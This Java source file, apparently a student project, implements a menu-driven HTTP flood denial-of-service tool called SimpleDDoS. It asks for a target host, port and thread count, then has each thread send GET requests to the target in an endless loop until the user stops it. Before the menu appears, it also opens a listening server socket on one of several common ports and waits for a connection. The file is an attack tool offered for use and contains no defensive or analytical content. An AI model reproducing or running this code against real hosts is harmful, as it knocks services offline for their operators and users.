package simpleddos;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public class SimpleDDoS {

    private static final AtomicBoolean attackRunning = new AtomicBoolean(false);
    private static ExecutorService executorService;
    private static boolean isClientConnected = false;
    private static Socket clientSocket = null;

    public static void main(String[] args) {

        Scanner scanner = new Scanner(System.in);

        while (true) {
            System.out.println("\n");
            System.out.println(" ________  _________         __________");
            System.out.println(" \\\\_____ \\ \\\\______ \\  ____ //   _____/");
            System.out.println("  ||  ||  \\ ||    || \\// _ \\\\\\_____ \\ ");
            System.out.println("  ||  ||   \\||    || (( <_> )        \\");
            System.out.println(" //______  /_______  /\\\\___/_______  /");
            System.out.println("        \\\\/       \\\\/             \\\\/ ");
            System.out.println(" __________    _______    _________ ._____________  ");
            System.out.println(" \\\\______  \\  //  _   \\  /   _____/ |   \\\\_   ___ \\ ");
            System.out.println(" ||    || _/ //  /_\\   \\ \\\\_____  \\ |   //    \\ \\\\/ ");
            System.out.println(" ||    ||  \\//    ||    \\//        \\|   \\\\     \\____");
            System.out.println(" ||______  /\\\\____||__  //_______  /|___|\\\\______  /");
            System.out.println("        \\\\/          \\\\/        \\\\/             \\\\/ ");

            System.out.println("\n");
            System.out.println("If you have any questions or suggestions, don't hesitate to share. Keep learning, keep growing.");
            System.out.println("Source Code: https://github.com/NTVuong23/BMTT/tree/BMTT");
            System.out.println("\n");

            System.out.println("===== Main Menu =====");

            try {
                server();
            } catch (IOException e) {
                System.out.println("Error starting server: " + e.getMessage());
            }

            System.out.println("1. Start DDoS Attack");
            System.out.println("2. Exit");
            System.out.print("Select an option: ");

            String choice = scanner.nextLine();

            switch (choice) {
                case "1":
                    startDDoSAttack(scanner);
                    break;
                case "2":
                    System.out.println("Exiting...");
                    scanner.close();
                    return;

                default:
                    System.out.println("Invalid choice! Please select 1 or 2.");
            }
        }
    }

    private static void server() throws IOException {

        if (isClientConnected) {
            System.out.println("A client is already connected. No need to reconnect.");
            return;
        }

        int[] ports = {80, 8080, 9000, 135, 445, 902, 912, 5040, 49664, 49665, 49666, 49667, 49668, 49669, 49670, 49671, 49672, 49673, 49674, 49675, 49676, 49677};
        ServerSocket ss = null;

        for (int port : ports) {
            try {
                ss = new ServerSocket(port);
                System.out.println("Port(Server): " + port + "... Waiting for connection from client...");
                break;
            } catch (IOException e) {
                System.out.println("Port: " + port + " not available, trying another port...");
            }
        }
        if (ss == null) {
            System.out.println("No ports available to listen on. Server cannot start.");
            return;
        }

        clientSocket = ss.accept();
        isClientConnected = true;
        System.out.println("Client connected.");

        InetAddress clientAddress = clientSocket.getInetAddress();
        System.out.println("IP: " + clientAddress.getHostAddress());

        InputStreamReader in = new InputStreamReader(clientSocket.getInputStream());
        BufferedReader bf = new BufferedReader(in);
        String str = bf.readLine();
        System.out.println("Client: " + str);
    }

    private static void startDDoSAttack(Scanner scanner) {
        System.out.print("Enter target IP/hostname: ");
        String targetHost = scanner.nextLine();

        if (!isValidHost(targetHost)) {
            System.out.println("Invalid host. Returning to menu...");
            return;
        }

        int targetPort = promptForPort(scanner);
        int threadCount = promptForThreads(scanner);

        System.out.println("Checking connection to " + targetHost + ":" + targetPort + "...");
        if (!checkConnection(targetHost, targetPort)) {
            System.out.println("Unable to connect to target. Please check the IP address or port.");
            return;
        }

        System.out.println("Connection successful! Launching DDoS attack with " + threadCount + " threads...");

        attackRunning.set(true);
        executorService = Executors.newFixedThreadPool(threadCount);

        for (int i = 0; i < threadCount; i++) {
            final String finalTargetHost = targetHost;
            final int finalTargetPort = targetPort;
            executorService.submit(() -> performAttack(finalTargetHost, finalTargetPort));
        }

        manageAttack(scanner);
    }

    private static void performAttack(String targetHost, int targetPort) {
        try {
            while (attackRunning.get()) {
                try (Socket socket = new Socket(targetHost, targetPort)) {
                    OutputStream out = socket.getOutputStream();
                    out.write(("GET / HTTP/1.1\r\nHost: " + targetHost + "\r\n\r\n").getBytes());
                    out.flush();
                    System.out.println("Sent request to " + targetHost + ":" + targetPort);
                } catch (IOException e) {
                    if (attackRunning.get()) {
                        System.out.println("Error sending request: " + e.getMessage());
                    }
                }
            }
        } catch (Exception e) {
            System.out.println("Thread encountered an error: " + e.getMessage());
        }
    }

    private static void manageAttack(Scanner scanner) {
        while (attackRunning.get()) {
            System.out.print("'Y' to stop the attack: ");
            String command = scanner.nextLine();
            if ("Y".equalsIgnoreCase(command)) {
                stopThreads();
                System.out.println("Attack stopped. Returning to menu...");
                return;
            } else {
                System.out.println("Invalid command. Enter 'Y' to stop.");
            }
        }
    }

    private static boolean checkConnection(String host, int port) {
        try (Socket socket = new Socket(host, port)) {
            return true;
        } catch (Exception e) {
            System.out.println("Connection error: " + e.getMessage());
            return false;
        }
    }

    private static boolean isValidHost(String host) {
        try {
            InetAddress.getByName(host);
            return true;
        } catch (Exception e) {
            System.out.println("Invalid host: " + e.getMessage());
            return false;
        }
    }

    private static int promptForPort(Scanner scanner) {
        while (true) {
            System.out.print("Enter target port (default 80): ");
            String input = scanner.nextLine();
            if (input.isEmpty()) {
                return 80; 
            }
            try {
                int port = Integer.parseInt(input);
                if (port > 0 && port <= 65535) {
                    return port;
                }
                System.out.println("Invalid port! Must be between 1 and 65535.");
            } catch (NumberFormatException e) {
                System.out.println("Invalid input! Please enter a number.");
            }
        }
    }

    private static int promptForThreads(Scanner scanner) {
        while (true) {
            System.out.print("Enter the number of threads to run (default 10): ");
            String input = scanner.nextLine();
            if (input.isEmpty()) {
                return 10;
            }
            try {
                int threads = Integer.parseInt(input);
                if (threads > 0) {
                    return threads; 
                }
                System.out.println("Thread count must be greater than 0.");
            } catch (NumberFormatException e) {
                System.out.println("Invalid input! Please enter a number.");
            }
        }
    }

    private static void stopThreads() {
        attackRunning.set(false);
        executorService.shutdownNow();
        System.out.println("All threads stopped.");
    }
}
